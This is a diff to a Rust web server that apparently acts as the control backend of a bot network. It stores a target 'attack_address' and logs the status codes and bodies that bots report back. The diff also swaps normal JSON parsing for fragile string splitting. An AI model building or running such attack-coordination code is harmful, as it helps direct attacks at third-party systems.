@@ -10,6 +10,7 @@ use router::Router;
 use rusqlite::Connection;
 use serde_json;
 use std::vec;
+use serde_json::Value;
 
 fn create_tables (conn: &Connection){
     conn.execute(
@@ -76,7 +77,7 @@ fn main() {
             };
             let conn = Connection::open("bot_network.db").unwrap();
             create_tables(&conn);
-            println!("Attacking {}", _received["address"].to_string());
+            // println!("Attacking {}", _received["address"].to_string());
             conn.execute("DELETE FROM attack_address", []).unwrap();
             conn.execute("INSERT INTO attack_address (address) VALUES (?1)", [_received["address"].to_string()]).unwrap();
             Ok(Response::with((status::Ok, "ok")))
@@ -87,12 +88,24 @@ fn main() {
     router.post(
         "/attack_info",
         move |req: &mut Request| {
-            let res = req.get::<bodyparser::Json>().unwrap().unwrap();
+            let mut response = req.get::<bodyparser::Json>().unwrap().unwrap().to_string();
+            response = response.strip_prefix("[\"{").unwrap().to_string().strip_suffix("}\"]").unwrap().to_string();
+            let resp: Vec<&str> = response.split("}\",\"{").collect();
+            let mut jsons: Vec<Value> = vec![];
+            for elem in resp {
+                let mut val = elem.to_string();
+                let mut splitted = val.split("\",").collect::<Vec<&str>>();
+                let mut code = splitted.pop().unwrap().to_string().split("\":").collect::<Vec<&str>>()[1].to_string();
+                let mut body = splitted.pop().unwrap().to_string().split(":").collect::<Vec<&str>>()[1].to_string();
+                jsons.push(serde_json::json!({"code": code, "body": body}));
+            }
             let conn = Connection::open("bot_network.db").unwrap();
             create_tables(&conn);
-            conn.execute(
-                "INSERT INTO request_info (status_code, received_data) VALUES (?1, ?2)",
-                [res["code"].to_string(), res["body"].to_string()]).unwrap();
+            for res in jsons.iter(){
+                conn.execute(
+                    "INSERT INTO request_info (status_code, received_data) VALUES (?1, ?2)",
+                    [res["code"].to_string(), res["body"].to_string()]).unwrap();
+            }
             Ok(Response::with((status::Ok, "ok")))
         },
         "set_attack_info",
@@ -100,3 +113,4 @@ fn main() {
 
     Iron::new(router).http("localhost:8080").unwrap();
 }
+
